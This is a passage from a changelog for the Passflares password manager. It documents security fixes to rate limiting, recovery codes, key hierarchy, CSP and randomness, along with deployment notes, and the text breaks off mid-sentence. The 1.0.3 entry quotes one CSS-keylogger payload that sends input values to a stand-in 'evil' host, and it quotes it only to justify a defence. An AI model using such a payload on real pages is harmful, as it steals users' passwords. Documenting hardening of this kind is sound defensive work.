# Changelog

All notable changes to Passflares are documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [1.1.5] — 2026-08-03

Security release. Closes the three remaining advisories from the audit at
`7b7d66b`, plus the two public issues they depend on. No user action required
and no data migration — but a **D1 migration and a Durable Object namespace are
provisioned on deploy** (see Deployment below).

### Security

- **The brute-force limiter is now atomic** (`GHSA-vp89-22wm-gjr8`, high). The
  "5 attempts per 15 minutes" lockout on `/api/login` and `/api/register` was
  bypassable by sending requests concurrently: the KV counter was a
  read-modify-write, so N simultaneous requests all read the same value and all
  wrote the same increment — N guesses for one tick — and KV's eventual
  consistency meant reads at other edge locations could be stale for up to ~60s
  on top of that. Replaced with a Durable Object (one instance per limiter
  subject, never a global singleton) whose read-modify-write is serialised by
  the runtime's input gates ([src/rateLimiter.ts](src/rateLimiter.ts)).
- **Credential endpoints are limited per account as well as per IP.** An IP-only
  cap was the whole control, which a distributed attacker sidesteps entirely and
  which let one abuser lock out every user behind a shared NAT egress. Lockouts
  now start at 15 minutes and double per further failure to a 24-hour ceiling,
  and 429s carry `Retry-After`.
- **Recovery codes can no longer be redeemed twice** (`GHSA-q9vh-jccv-9p23`,
  medium). Consumption was a `SELECT … used_at IS NULL` followed by an unrelated
  `UPDATE … WHERE id = ?`, so two concurrent requests presenting the same code
  both saw it unused and both succeeded. It is now one guarded `UPDATE` whose
  result count decides the winner ([src/totp.ts](src/totp.ts)).
- **Every second-factor verification path is throttled**
  (`GHSA-q9vh-jccv-9p23`). `handleTotpEnable`, `handleTotpDisable`, the
  change-authenticator branch of
  `handleTotpEnroll` and `handleRegenerateRecoveryCodes` had no attempt cap
  at all — the enable path allowed unlimited guesses against a 6-digit code. All
  four now share one per-account budget, as do the master-password
  re-authentication paths on password change and account deletion.
- **Constant-time verifier comparison is enforced by a test**
  (`GHSA-jrh6-9qp8-rfgf`, low). The comparison itself was fixed in 1.1.4;
  `tests/backend/code-security-invariants.test.ts` now fails the build if a
  `*_hash` is ever compared with `===` or `!==` again.
- **Credential fields are length-bounded** before reaching scrypt. `authSecret`
  and `masterPassword` were unbounded and fed straight into a memory-hard KDF
  doing ~48 MiB of work per call, on an unauthenticated endpoint.

### Fixed

- **Audit writes are no longer dropped**
  ([#73](https://github.com/PierreFouquet/Passflares/issues/73)).
  `logAudit` was `async`, called ~120 times and awaited nowhere, so the D1 write
  was unregistered I/O that Workers may cancel once the response returns — and
  the events most likely to be lost were the fast-return ones (`LOGIN_FAILURE`,
  `AUTH_FAILURE`, `VAULT_ACCESS_DENIED`) — exactly the set that reveals an
  attack. It now returns `void` and registers its write with
  `ctx.waitUntil()`, so no call site can leave a floating promise
  ([src/auditLog.ts](src/auditLog.ts)).
- **The audit log has retention.** A nightly cron deletes rows older than 90
  days, over the new `audit_logs` indexes. There was previously no TTL, no
  pruning and no partitioning on a table taking a row per request and sharing
  D1's 10 GB limit with the vault metadata the service needs to function.
- **Routine reads are no longer audited.** `VAULT_LIST_SUCCESS`,
  `VAULT_DOWNLOAD_SUCCESS`, `GET_SALT_SUCCESS`, `ORG_LIST_SUCCESS`,
  `ORG_GET_MEMBERS_SUCCESS` and `PREFERENCES_UPDATE` recorded page loads rather
  than actions — the app wrote several rows on every boot, and a theme toggle
  wrote a burst. All failure events are still recorded.
- **Audit payloads store an error code, not `error.message`.** Exception text
  can carry internal detail and was persisted indefinitely. The full error still
  reaches the observability logs via `console.error`.
- **The audit log is readable.** README claimed audit events were available;
  no read path existed. Each account can now see its own security events under
  **Settings → Recent activity** (`GET /api/users/me/audit-log`), with keyset
  pagination. This needed no admin role — the session token already scopes it,
  so no new privilege surface was added.
- **Malformed JSON returns 400, not 500**
  ([#78](https://github.com/PierreFouquet/Passflares/issues/78)). Handlers
  destructured `await request.json()` outside any `try`, so a bad body threw
  past the handler and came back as `Service unavailable`.
- **Unknown `/api/*` routes return a JSON 404** instead of falling through to
  the asset handler, which served an HTML page under the *API* CSP.
- **Vault and organisation names and descriptions are length-capped**
  (100 / 500).
- **Organisation members are no longer stranded without vault keys**
  ([#69](https://github.com/PierreFouquet/Passflares/issues/69) residue). Key
  shares were wrapped exactly once, at the instant a member was added, so any
  wrap that was impossible right then never happened at all — most often because
  the member was invited before their first sign-in and had no keypair to wrap
  to. They signed in, and nothing went back to finish the job; they stayed
  locked out of vaults they were entitled to, told to "ask an administrator",
  with no action that would actually help. The same applied if the inviting
  admin could not open a vault, or the request was interrupted.
  A new `GET /api/organizations/:orgId/key-gaps` reports who is entitled to an
  org vault but holds no share (entitlement only — never key material), and
  `reconcileOrgVaultKeys()` closes every gap the caller can reach. It runs
  automatically whenever a key-holding member opens the Organisations page, and
  on demand via **Re-share vault keys**. It only ever adds shares, so it can
  never revoke, and it is safe to run repeatedly. Available to every member, not
  just admins — making convergence depend on one specific person is what caused
  the problem.

### Changed

- `vitest.config.ts` → `vitest.config.mts`, using `import.meta.dirname`. Vite's
  forthcoming native config loader treats the config as real ESM, where the
  previous form warns today and breaks on that release.
- The `RATE_LIMIT` KV namespace binding is gone; nothing uses it. The namespace
  itself can be deleted from the Cloudflare account once 1.1.5 is live.

### Deployment

Two provisioning steps beyond a normal deploy, both completed ahead of this
release so that shipping it is an ordinary deploy:

1. `npx wrangler d1 migrations apply secure-password-db --remote` — applies
   the new `audit_logs` and `user_recovery_codes` indexes. Purely additive
   (`CREATE INDEX IF NOT EXISTS`), safe to run against the live database ahead
   of the deploy, and compatible with 1.1.4 code.
2. The `RateLimiter` Durable Object namespace was created by the
   `new_sqlite_classes` migration in
   [#87](https://github.com/PierreFouquet/Passflares/pull/87), landed
   separately and deliberately: a class migration is an atomic control-plane
   operation that only `wrangler deploy` can apply, so the `wrangler versions
   upload` that branch builds run rejects it outright
   (`[code: 10211]`) — no branch containing an unapplied migration can have a
   green build. Splitting it kept that unavoidable red on a nine-file change
   with no behavioural effect, and left this release building normally.

## [1.1.4] — 2026-08-01

Security release. Passflares was **server-trusting rather than zero-knowledge**:
the master password was sent to the Worker on every authentication, and the
vault key was derived from that same password using a salt the server stored.
Anyone able to run code in the Worker request path could therefore harvest
plaintext master passwords and decrypt every vault.

This release replaces that with a proper key hierarchy. **Existing accounts
upgrade automatically and silently the next time they sign in** — no user action
is required, and no data is re-encrypted from the user's point of view.

### Security

- **The master password no longer leaves the browser**
  (`GHSA-pqm6-r3vj-mhvq`). It is stretched with Argon2id (m=47104 KiB, t=1, p=1)
  and split by HKDF into two independent values: an `authSecret` sent to the
  server, and a key-encryption key that stays local. The server stores
  `scrypt(authSecret)` and cannot derive any vault key from it. Argon2id also
  replaces PBKDF2-SHA256/600k, which was memory-less and cheap to attack on GPUs
  ([public/js/keys.js](public/js/keys.js),
  [public/js/auth-flow.js](public/js/auth-flow.js), [src/auth.ts](src/auth.ts)).
- **Per-vault keys with per-member wrapping.** Each vault now has its own random
  AES-256-GCM key, wrapped for each member via ECIES over P-256 ECDH. Granting
  access writes one row and never re-encrypts vault contents
  ([migrations/0005_key_hierarchy.sql](migrations/0005_key_hierarchy.sql),
  [public/js/vault-keys.js](public/js/vault-keys.js)).
- **Constant-time verifier comparison** (`GHSA-jrh6-9qp8-rfgf`). Password and
  recovery-hash comparisons used `!==`, which short-circuits on the first
  differing byte ([src/utils.ts](src/utils.ts), [src/totp.ts](src/totp.ts)).
- **`/api/auth/params` is not an account-existence oracle.** Unknown emails
  receive deterministic decoy Argon2id parameters, indistinguishable in shape and
  stable across retries, and the endpoint is rate-limited per IP.
- **Email is normalised and validated server-side.** `Foo@example.com` and
  `foo@example.com` were previously two separate accounts with two separate
  vault sets; the only validation was the browser's `type="email"`, bypassed by
  calling the API directly.
- **`r2_object_key` is no longer disclosed to clients** (#80). It is an internal
  storage identifier nothing client-side addresses anything by, and it leaked the
  `user_N`/`org_N` owner prefix plus a UUID.
- **Web Worker CSP.** `worker-src 'self'` added so Argon2id can run off the UI
  thread. Still no `unsafe-eval` and no WASM — the implementation is vendored
  plain ES modules ([src/worker.ts](src/worker.ts)).

### Fixed

- **Changing your master password can no longer destroy vault data** (#70). The
  old flow decrypted and re-uploaded *every vault the user could see* — including
  organisation vaults where they held only `read` — before telling the server the
  password had changed. A `403` partway through the upload loop was swallowed by a
  snackbar, leaving R2 holding ciphertext under a key D1 had never heard of. That
  was the default path for any org member, not an edge case. Password rotation now
  re-seals a single key blob and never touches vault ciphertext at all
  ([public/js/pages/settings.js](public/js/pages/settings.js)).
- **Shared and organisation vaults are now decryptable by their members** (#69).
  Vault contents were encrypted with a key derived from one individual's master
  password, so no member other than the vault's creator could ever read them —
  and the error told them their *credentials* were wrong, when the real problem
  was that the data had never been encrypted for them. Vaults created before this
  release are re-keyed and shared with the whole organisation the next time their
  creator opens them ([public/js/vault-keys.js](public/js/vault-keys.js),
  [public/js/org-keys.js](public/js/org-keys.js)).
- **Removing an organisation member now revokes their key access.** Their key
  shares are deleted, and the client rotates and re-wraps the affected vault keys
  for the remaining members — revocation has to assume the removed member cached
  the old key ([src/organizations.ts](src/organizations.ts)).
- **Vault writes are non-destructive under re-encryption** (#70). A write under a
  new key version is staged beside the live blob; it only becomes authoritative
  when the server flips `vaults.current_key_version` in a single atomic batch.
  That column existed since `0001_init.sql` but was hardcoded to `'v1'` and never
  read ([src/vaults.ts](src/vaults.ts)).
- **ID parsing no longer coerces** (#80). `parseInt('12abc', 10)` returned `12`
  and `Number('0x10')` returned `16`, so two different URLs could address the same
  row. Only plain decimal digits are accepted ([src/utils.ts](src/utils.ts)).
- Deprecated `String.prototype.substr()` replaced with `slice()`, and the
  triplicated hex helpers consolidated to one implementation per side (#80).

### Changed

- **`npm audit` and `npm install` are clean of deprecation warnings.**
  `http-server` was unmaintained and pulled in a deprecated dependency chain
  (`html-encoding-sniffer@3` → `whatwg-encoding@2`). Replaced with a ~50-line
  zero-dependency Node static server for the E2E run, removing 46 packages
  ([scripts/static-server.mjs](scripts/static-server.mjs)).
- **README rewritten around an explicit threat model** (#79). The previous
  security section claimed "Your Master Password never leaves your device", which
  was not true of the implementation; it is now, and the documentation says
  precisely what each control does and does not defend against. Structural drift
  fixed: `src/totp.ts`, migrations `0004`/`0005`, and the required `TOTP_ENC_KEY`
  secret are all documented.
- `package.json` license corrected from `ISC` to `GPL-3.0-or-later` to match
  `LICENSE` and the README (#80).
- Dead Argon2id constants (`KDF_MEMORY`, `KDF_PARALLELISM`) removed from
  `public/js/constants.js` — they were imported but never used, and the file's
  header comment claimed an algorithm the code did not use (#80).

### Tests

- Key hierarchy round-trips: a vault key wrapped for one member opens for them
  and for nobody else, and a share cannot be replayed onto another vault
  ([tests/frontend/keys.test.js](tests/frontend/keys.test.js)).
- Wire-format assertions that inspect every request body for the master password
  itself — the property that actually closes the advisory
  ([tests/frontend/auth-flow.test.js](tests/frontend/auth-flow.test.js)).
- Upgrade atomicity: a single `D1.batch()`, idempotent on re-run, and refusing to
  re-key a vault the caller does not own
  ([tests/backend/auth.test.ts](tests/backend/auth.test.ts)).
- Staged writes never overwrite the live blob; the version flip is atomic; a
  `manage` holder cannot mint a key share for an outsider
  ([tests/backend/vault-keys.test.ts](tests/backend/vault-keys.test.ts)).
- A guardrail asserting the vendored Argon2id files stay byte-identical to the
  installed `@noble/hashes`
  ([tests/backend/vendor-integrity.test.ts](tests/backend/vendor-integrity.test.ts)).

### Upgrade notes

- **Run `npx wrangler d1 migrations apply secure-password-db --remote` before
  merging.** `main` auto-deploys, and the Worker requires migration `0005`.
  The migration is additive only — no column is dropped, and every v1 account
  keeps working until its owner next signs in.
- Accounts still on `auth_version = 1` retain their legacy `encryption_salt`
  until their pre-upgrade organisation vaults have been re-keyed. Until then such
  an account is not yet fully zero-knowledge; this is stated in the README rather
  than glossed.
- The legacy columns are retired in a later migration, once the
  `auth_version = 1` population reaches zero.

## [1.1.3] — 2026-06-20

Bug-fix release addressing a first-login rendering issue on the home dashboard.

### Fixed

- **Vaults now appear on Home immediately after signing in** (#54). On first
  login the dashboard rendered before any vault data had been loaded into
  state: `prefetchVaults()` only seeded organisations, leaving the recent-vaults
  list empty and the "Vaults" tile reading `0` until the user navigated to
  another page (which loaded vaults as a side effect) and back. Boot now
  prefetches both organisations **and** vaults into shared state before the
  first render, so the dashboard — and the global search palette, which reads
  the same state — have their data up front
  ([public/js/main.js](public/js/main.js)).

### Tests

- E2E regression test that seeds a vault, signs in, and asserts it is visible
  in the recent-vaults list and counted by the Vaults tile *without* navigating
  away first ([tests/e2e/dashboard.spec.ts](tests/e2e/dashboard.spec.ts)).

## [1.1.2] — 2026-05-31

Bug-fix release. Two issues found in the live 1.1.1 app — both first noticed
on mobile — plus a regression guard so neither class recurs.

### Fixed

- **Creating an organisation-owned vault no longer logs you out** (#38).
  Organisation creators are seeded with the `super_admin` role, but vault
  creation only accepted the literal `admin` role, so an owner creating a
  vault for their own org got a `403` — which the client treated as a lost
  session and reloaded to the login screen. Vault creation now accepts any
  administrative role via a shared `ADMIN_ROLES` constant
  ([src/types.ts](src/types.ts), [src/vaults.ts](src/vaults.ts),
  [src/organizations.ts](src/organizations.ts)). The cause is server-side, so
  desktop and mobile behaved identically.
- **A `403 Forbidden` no longer destroys the session**
  ([public/js/api.js](public/js/api.js)). The client re-authenticates only on
  `401` (a genuinely invalid/expired token); a `403` is surfaced as an inline
  error, so a permission denial can't masquerade as a forced logout.
- **Two-factor settings icons render correctly** (#39). The Material Symbols
  font is a subset, and the 2FA buttons use `sync` / `password` /
  `remove_moderator` — three glyphs never added to the subset when 2FA shipped
  in 1.1.0, so they rendered as their literal ligature text ("SYNC",
  "PASSWORD", "REMOVE_MODERATOR"). Regenerated the subset `.woff2`
  ([public/fonts/material-symbols/](public/fonts/material-symbols/MaterialSymbolsRounded.woff2))
  and updated the documented icon list
  ([public/fonts/README.md](public/fonts/README.md)).
- **First-time 2FA enrolment shows its QR immediately**
  ([public/js/pages/settings.js](public/js/pages/settings.js)) instead of an
  empty slot until the action button was clicked; the action now reads "Verify".

### Tests

- Org-owned vault creation across `super_admin` / `admin` / `member` /
  non-member, and the client `401`-vs-`403` distinction
  ([tests/backend/vaults.test.ts](tests/backend/vaults.test.ts),
  [tests/frontend/api.test.js](tests/frontend/api.test.js)).
- New icon-subset guardrail that fails when any icon used in the shipped
  HTML/JS is missing from the bundled font subset
  ([tests/backend/icon-subset.test.ts](tests/backend/icon-subset.test.ts)).

## [1.1.1] — 2026-05-30

Production domain migration to **passflares.com**. The app moves off its
launch host `passflares.pierrefouquet.co.uk` to a dedicated apex domain. This
is a hard cutover — the old host is retired — so existing users sign in once on
the new origin (the session token lives in per-origin `localStorage`). The
zero-knowledge model, vault encryption, and 2FA are unchanged; nothing about
how data is stored or encrypted moves with the domain.

### Changed

- **Serving origin → `passflares.com`** ([wrangler.toml](wrangler.toml)). The
  Worker route is now `passflares.com/*` on the `passflares.com` zone.
  `www.passflares.com` is also routed to the Worker, which permanently
  redirects every www request to the apex (`redirectToCanonicalHost` in
  [src/worker.ts](src/worker.ts), preserving path + query, HSTS on the 301).
- **CORS allow-list + default origin** ([src/worker.ts](src/worker.ts)) now
  name `passflares.com` (and a reserved `api.passflares.com`) instead of the
  old `pierrefouquet.co.uk` origins. The live serving origin is now explicitly
  on the allow-list — previously it relied on requests being same-origin.
- **CSP `connect-src`** ([src/worker.ts](src/worker.ts)) points at
  `https://api.passflares.com` (reserved for future use; no such service ships
  in this release). HSTS, the rest of the CSP, and all other security headers
  are domain-agnostic and unchanged.
- **`security.txt` canonical URL**
  ([public/.well-known/security.txt](public/.well-known/security.txt)) and the
  documentation/live-site links in [README.md](README.md) updated to
  `passflares.com`. The in-app footer version (stale at `v1.0.1`) is corrected
  to `v1.1.1`.
- **More observability** ([wrangler.toml](wrangler.toml)). Worker invocation
  logs (`invocation_logs = true`) and traces (`[observability.traces]`,
  `enabled = true`) are now both turned on. No code or data impact.

### Tests

- CORS/security/header-injection fixtures
  ([tests/backend/cors-strict.test.ts](tests/backend/cors-strict.test.ts),
  [tests/backend/worker-security.test.ts](tests/backend/worker-security.test.ts),
  [tests/backend/header-injection.test.ts](tests/backend/header-injection.test.ts))
  now assert against `https://passflares.com`.

### Migration / deployment

- **No database change and no new secrets.** D1 stores nothing domain-coupled;
  `JWT_SECRET`, `TURNSTILE_KEY`, and `TOTP_ENC_KEY` are unaffected.
- Cloudflare-side prerequisites, staged **before** merge (merge = auto-deploy):
  proxied DNS records for `passflares.com` and `www` (the www→apex redirect is
  handled in the Worker, so no edge redirect rule is needed), a verified
  Universal SSL edge certificate, and `passflares.com` added to the existing
  Turnstile widget's hostname allow-list (same site key + secret — no code
  change).
- Post-cutover cleanup: drop the old `passflares.pierrefouquet.co.uk` Worker
  route and its DNS record so it no longer serves.
- **HSTS is enforced by the Worker, not the Cloudflare edge.** The new
  `passflares.com` zone shipped with edge HSTS set to *max-age=0*, which
  silently overrode the Worker's `Strict-Transport-Security: max-age=31536000;
  includeSubDomains; preload` — caught by the `security-headers-live` probe.
  Resolved by disabling the edge HSTS feature so the Worker's header (defined
  in [src/worker.ts](src/worker.ts) and covered by tests) is authoritative;
  verified live, 12/12 probe green.

## [1.1.0] — 2026-05-30

Two-factor authentication (TOTP) with single-use recovery codes. 2FA is
opt-in: a signed-in user enables it from Settings, and from then on login is
a two-step flow — master password, then a 6-digit authenticator code (or a
recovery code). The zero-knowledge model is unchanged — 2FA is purely an
authentication gate and never touches the client-side vault key, which is
still derived from the master password alone.

### Added

- **TOTP enrolment** ([src/totp.ts](src/totp.ts),
  [migrations/0004_totp_2fa.sql](migrations/0004_totp_2fa.sql)). The server
  issues a *pending* secret; the client shows a QR code + the base32 secret,
  and the secret is only activated once a valid code confirms it. Built on
  the `otpauth` library; QR codes are rendered server-side as an inline SVG
  data URI (`qrcode-svg`), which the existing `img-src 'self' data:` CSP
  already allows — no client-side QR dependency, no CSP change.
- **Single-use recovery codes.** Ten codes are issued on enable, shown once,
  and stored as peppered HMAC-SHA256 hashes — not the slow scrypt KDF, since
  recovery codes are high-entropy and a fast hash allows an O(1) lookup and
  avoids running scrypt up to 10× per recovery login on the Worker. Each
  works once; **Regenerate recovery codes** replaces the set.
- **Two-step login.** `POST /api/login` returns a short-lived token scoped to
  `2fa` (carrying `sub`, not `userId`) instead of a session when 2FA is
  enabled; `POST /api/login/2fa` exchanges it plus a TOTP/recovery code for
  the real session + encryption salt. The auth middleware rejects the
  `2fa`-scoped token on every protected route, so it can never reach vault
  data. The verification endpoint is rate-limited per IP and per user.
- **Change authenticator** (move to a new phone) and **Disable 2FA**, both
  requiring the master password plus a current code (or recovery code).
  Changing keeps the old authenticator valid until the new one is confirmed,
  so there is no lock-out window.
- **TOTP secrets encrypted at rest** with AES-GCM under a new `TOTP_ENC_KEY`
  worker secret (HKDF-derived sub-keys separate the encryption key from the
  recovery-code pepper). Fails closed if the secret is unset.
- Settings UI, the login second-factor prompt,
  [public/css/components/totp.css](public/css/components/totp.css), and a new
  "Two-factor authentication" section in the
  [user guide](public/docs/user-guide.html).

### Tests

- New backend suites [tests/backend/totp.test.ts](tests/backend/totp.test.ts)
  and [tests/backend/totp-handlers.test.ts](tests/backend/totp-handlers.test.ts)
  cover add / remove / change / the recovery-code lifecycle and the second
  login step. Frontend
  [tests/frontend/api-2fa.test.js](tests/frontend/api-2fa.test.js) and e2e
  [tests/e2e/2fa.spec.ts](tests/e2e/2fa.spec.ts) cover login with and without
  2FA, enrolment, disable, change, and recovery-code flows. Unit suite 329
  passing; e2e 63 passing / 17 intentionally skipped.
- The opt-in live header probe
  [tests/e2e/security-headers-live.spec.ts](tests/e2e/security-headers-live.spec.ts)
  now requires a CSP only on HTML/API responses, matching the worker's
  deliberate omission of CSP on static JS/CSS subresources (previously the
  probe and [worker-security.test.ts](tests/backend/worker-security.test.ts)
  disagreed).

### Migration / deployment

- Apply the new migration to production D1:
  `npx wrangler d1 migrations apply secure-password-db --remote` — additive
  (two new tables, `user_totp` and `user_recovery_codes`); no impact on
  existing users until they opt in.
- Set the new secret **before** deploying:
  `npx wrangler secret put TOTP_ENC_KEY` (a long random value, e.g.
  `openssl rand -base64 48`). 2FA enrol/verify fail closed without it;
  rotating it later invalidates existing 2FA enrolments.

## [1.0.4] — 2026-05-27

Site-recovery + security-hardening release. Three unrelated streams that all
hit at once:

1. **Live site recovery.** After 1.0.3 shipped, three Dependabot
   version-update PRs auto-merged on green CI: `itty-router` 4.2 → 5.0
   (renamed `Router` to `AutoRouter` and changed routing internals),
   `typescript` 5.9 → 6.0, and `@types/node` 20 → 25. The itty-router
   major was a breaking API change — the build compiled clean but the
   Worker threw `Error 1101` on every request once Cloudflare auto-
   deployed. Pinned all three back to known-good versions.

2. **Critical CodeQL alert: insecure randomness in the password
   generator.** CodeQL's `js/insecure-randomness` flagged five sites in
   [public/js/utils.js](public/js/utils.js) where
   `generateRandomPassword()` used `Math.random()` to pick characters —
   and used `.sort(() => Math.random() - 0.5)` for the final shuffle
   (which is both biased and non-CSPRNG). For a *password manager* this
   was a real failure mode: generated passwords were drawn from a
   predictable PRNG state. Rewrote the generator to use
   `crypto.getRandomValues()` with rejection-sampled unbiased
   `secureRandomInt()` and a proper Fisher-Yates shuffle.

3. **The e2e auth-bypass plumbing** (issue #27, filed in 1.0.3) is
   fixed. The root cause was that `boot()` requires both `isLoggedIn()`
   *and* `hasKey()`, but the test fixture could only seed localStorage
   — the encryption key is a derived `CryptoKey` that only exists in
   memory. Added a clearly-marked `__PASSFLARES_E2E_FAKE_KEY` window
   test seam in [public/js/main.js](public/js/main.js) and rewrote
   `gotoAndSeedLogin` in [tests/e2e/fixtures.ts](tests/e2e/fixtures.ts)
   to inject it via `addInitScript`. E2E suite now runs 45 / 0 / 17
   (passed / failed / skipped-intentional-live-deploy).

Closes #27.

### Fixed

- **CRITICAL — `generateRandomPassword`** in
  [public/js/utils.js](public/js/utils.js) no longer uses `Math.random()`.
  New `secureRandomInt(max)` helper does rejection-sampling on
  `crypto.getRandomValues` to avoid modulo bias. Final shuffle is a
  cryptographic Fisher-Yates, not the broken
  `Array.sort(() => Math.random() - 0.5)` pattern. Closes five
  CodeQL `js/insecure-randomness` alerts.
- **CodeQL `js/tainted-format-string`** in
  [public/js/router.js](public/js/router.js): `console.error` now
  receives `name` as a separate argument instead of inside the format
  string template, so a route name containing `%s` / `%d` can't consume
  the next argument as a placeholder value.
- **CodeQL `js/bad-tag-filter`** in
  [tests/backend/static-security-audit.test.ts](tests/backend/static-security-audit.test.ts):
  the inline-script regex now matches `</script\s*>` (HTML5 permits
  whitespace before the closing `>`).
- **E2E auth-bypass** (`gotoAndSeedLogin`): the test fixture now sets
  a `__PASSFLARES_E2E_FAKE_KEY` window flag via `page.addInitScript`
  before navigation; `boot()` honours it via a clearly-marked test
  seam. Closes issue #27.

### Changed

- **`@noble/hashes` 1.4.0 → 2.2.0.** Picks up the March 2026 self-audit,
  the `pbkdf2`/`blake2`/`turboshake`/`kt` `dkLen=0` handling fix, the
  `parallelHash` `blockLen=0` fix, and the `argon2` progress-callback fix.
  2.x requires `.js` extension on submodule imports, so
  [src/utils.ts](src/utils.ts) now imports `@noble/hashes/scrypt.js` and
  `@noble/hashes/utils.js`. Runtime behaviour unchanged. (This
  supersedes Dependabot PR #31, which is being closed.)
- **Pinned majors that broke 1.0.3 → main:** `itty-router` ^5.0.23
  → ^4.2.2, `typescript` ^6.0.3 → ^5.9.3, `@types/node` ^25.9.1 →
  ^20.19.41. These had auto-merged on green CI but `itty-router 5.x`
  broke the Worker runtime (Router → AutoRouter rename).
- **`dependabot.yml`** now ignores SemVer-major version-update PRs
  globally. Major bumps need a human review and a full test-suite
  pass before landing. Important: this `ignore` only affects the
  routine version-update channel — Dependabot security-update PRs
  (driven by GitHub Advisory Database CVEs, configured separately in
  repo Settings → Code security & analysis) are documented to ignore
  this field, so security PRs still flow through even if they are
  major-version bumps.
- Removed the stale `release` script from
  [package.json](package.json) — it referenced the `production` branch
  that was retired in commit `1fcbac5`.

### Added

- **Password generator regression tests** in
  [tests/frontend/utils.test.js](tests/frontend/utils.test.js):
  - `Math.random` must never be called during generation (stub +
    counter assertion).
  - `crypto.getRandomValues` must be invoked at least once per
    character generated.
  - Lengths < 4 are coerced to 4 (so all four character-class
    requirements can be met).
  - The Fisher-Yates shuffle actually moves characters around — the
    seeded `(lower, upper, digit, symbol)` quartet must not stay
    pinned at positions 0..3 across a 200-call statistical sample.

## [1.0.3] — 2026-05-27

CSP hardening release. Threat-modelled the residual XSS surface against the
master-password input (the single most valuable secret in the app) and
closed the CSS-keylogger vector that an HTML-injection bug — if one ever
slipped past escaping — could otherwise exploit. Also drops the legacy
browser XSS auditor header that has been used in the wild to selectively
disable JavaScript on otherwise-safe pages. Picked up follow-on findings
from Hardenize, ImmuniWeb, and a deliberate code-review pass.

### Changed

- **`Content-Security-Policy` tightened on HTML responses** in
  [src/worker.ts](src/worker.ts):
  - `default-src` flipped from `'self'` to `'none'` — deny by default;
    every resource type now must explicitly opt back in. Anything we
    forget to declare in future is blocked, not silently allowed.
  - `'unsafe-inline'` removed from `style-src`. This closes the
    CSS-keylogger attack vector
    (`input[value^="a"] { background: url('//evil/?'attr(value)) }`)
    that any future HTML-injection regression would otherwise expose
    against the master-password input. Sixteen inline `style="..."`
    attributes across `public/index.html` and the JS page templates
    were moved into utility classes in
    [public/css/base.css](public/css/base.css) and
    [public/css/components/pages.css](public/css/components/pages.css).
- **`X-XSS-Protection: 1; mode=block` → `X-XSS-Protection: 0`.** Modern
  browsers (Chrome 78+, Firefox) already removed their XSS auditors, and
  Safari's `mode=block` auditor has been used to selectively disable
  legitimate JavaScript in otherwise-safe pages. Explicitly off is the
  current best-practice configuration; CSP does the real work.
- `roleControl` / `removeBtn` helper variables in
  [public/js/pages/orgs.js](public/js/pages/orgs.js) were inlined into
  the `innerHTML` template so the new escapeHTML guardrail (below) can
  walk them statically.
- Icon-name interpolations (`${iconName}`, `${t.icon}`) now go through
  `escapeHTML()` everywhere. They were previously safe in practice, but
  wrapping them is the cheaper defence-in-depth choice and removes the
  guardrail test's false-positive on these identifiers.

### Added

- **`tests/backend/static-security-audit.test.ts`** gained three new
  guardrail suites:
  - No `style="..."` attribute may appear in any shipped HTML file.
  - No `style="..."` attribute may appear inside any JS template
    literal.
  - Every `${...}` interpolation inside an ``innerHTML = `…` ``
    template must either pass through `escapeHTML(...)` or match the
    small allowlist of statically-safe shapes (string/number literals,
    `SCREAMING_SNAKE` constant lookups, nested template literals,
    ternary/`??`/`||` expressions whose arms are themselves safe). A
    forgotten escape on a future PR fails CI before it can ship a
    stored-XSS vector through a vault, entry, or org name.
- **`worker-security.test.ts`** gained assertions that `default-src` is
  `'none'`, `style-src` carries no `'unsafe-inline'` (and no
  `'unsafe-hashes'`), and `X-XSS-Protection` is `0`.
- **`.github/dependabot.yml`** opens grouped weekly version-update PRs
  for npm and github-actions ecosystems. Pairs with the
  Dependabot-security-updates feature already enabled in repo settings,
  which handles security patches separately.

### Known follow-up (not blocking 1.0.3)

- The e2e suite's `gotoAndSeedLogin` fixture
  ([tests/e2e/fixtures.ts](tests/e2e/fixtures.ts)) seeds `jwtToken` /
  `userInfo` into localStorage and reloads, but the auth screen never
  hides — confirmed pre-existing on the previous tip of `main`, not
  caused by 1.0.3. Vitest (280/280) is the load-bearing signal for
  this release. The e2e suite needs a separate fix to its sign-in
  bypass plumbing.

## [1.0.2] — 2026-05-26

Follow-up to 1.0.1. A re-scan after 1.0.1 was deployed still flagged the same
missing-header findings on `passflares.pierrefouquet.co.uk`. Direct probing
revealed that the security headers were applied correctly to `/api/*`
responses but completely absent from `/` and `/js/*.js` — `cf-cache-status:
HIT`, no worker headers in sight. Root cause: Cloudflare Workers' `[assets]`
binding defaults to `run_worker_first = false`, so any request that matches a
static asset is served directly by the CDN and the Worker is never invoked.
1.0.1's `withSecurityHeaders()` was correct in code but never ran for the
HTML/JS/CSS responses the scanner was probing.

### Changed

- `wrangler.toml` and `wrangler.toml.example` now set
  `run_worker_first = true` on the `[assets]` binding. The Worker runs for
  every request, asset or not, so the security-header layer reaches static
  responses too.
- All five docs pages (`public/docs/*.html`) now load the theme bootstrap
  via `<script src="../js/prefs-bootstrap.js">` instead of an inline
  `<script>` block. Same fix the app shell got in 1.0.0; needed here too
  because the Worker (now running on every request) applies the strict CSP
  to the docs pages as well, and the inline block would have been blocked.
  Caught by the new `static-security-audit.test.ts` suite below.
- `package.json` adds `test:audit` (`npm audit --audit-level=moderate`)
  and chains it into `test:all` so dependency vulnerabilities surface
  alongside test failures. Initial run cleared three moderate-severity
  transitive findings in `ws` (via `miniflare` via `wrangler`) by way of
  a non-breaking `npm audit fix`.

### Added

- `tests/backend/wrangler-config.test.ts` — parses `wrangler.toml` and
  `wrangler.toml.example` and asserts `[assets].run_worker_first === true`.
  Regression guard for this exact bypass.
- `tests/backend/cors-strict.test.ts` — unknown / missing `Origin` does
  not get echoed back; CORS never combines `*` with `Allow-Credentials: true`;
  OPTIONS preflight carries the base security headers too.
- `tests/backend/http-methods.test.ts` — TRACE rejected, vault routes
  return 401 + security headers when called without `Authorization`,
  unknown `/api/*` paths return 404 with security headers, HEAD matches GET.
- `tests/backend/header-injection.test.ts` — CR/LF bytes in `Origin`
  and request bodies never appear verbatim in response headers; oversize
  `Origin` is ignored, not echoed.
- `tests/backend/static-security-audit.test.ts` — repo-level greps:
  no `http://` URLs in `public/**`, no PEM markers, no `console.log` or
  `debugger` left in `public/js/**`, no inline `<script>` blocks in any
  `public/**/*.html`, `robots.txt` exposes no admin paths.
- `tests/backend/vuln-classes.test.ts` — behavioural tests for IDOR,
